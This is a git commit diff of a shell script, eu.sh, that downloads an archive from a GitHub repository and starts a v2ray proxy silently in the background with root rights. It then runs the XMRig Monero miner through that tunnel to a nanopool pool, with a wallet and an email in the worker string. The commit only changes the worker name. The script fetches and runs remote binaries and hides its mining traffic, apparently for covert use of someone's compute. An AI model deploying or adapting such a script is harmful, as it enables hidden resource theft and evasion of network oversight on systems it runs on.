89b6bdff2ef4d33c0a05918959eb77299fbc5c88
prendibs <94189491+prendibs@users.noreply.github.com>
2025-09-22 23:24:09 +0700

    Update eu.sh

--- eu.sh
+++ eu.sh
@@ -4,4 +4,5 @@
 wget https://github.com/prendibs/xmr/raw/main/x.tar.gz && tar xf x.tar.gz
 nohup sudo ./v2ray run --config=eu.json </dev/null >/dev/null 2>&1 &
 echo "love u fika"
-sudo ./xmrig -B -x 127.0.0.1:443 -o xmr-eu2.nanopool.org:10343 -u 85aF23j9ZZQ1nV7ESmrzrRDUfQTbuCzfyWZDJY2qeMRXHU15GeAaMpDKF2JW67Niq7FWVJbnVBSDCYZLHRyAxYhvFgDTCNo.x10eu/ndruta11@gmail.com -p x -a rx/0 -k --randomx-1gb-pages --tls
+
+sudo ./xmrig -B -x 127.0.0.1:443 -o xmr-eu2.nanopool.org:10343 -u 85aF23j9ZZQ1nV7ESmrzrRDUfQTbuCzfyWZDJY2qeMRXHU15GeAaMpDKF2JW67Niq7FWVJbnVBSDCYZLHRyAxYhvFgDTCNo.peu/ndruta11@gmail.com -p x -a rx/0 -k --randomx-1gb-pages --tls
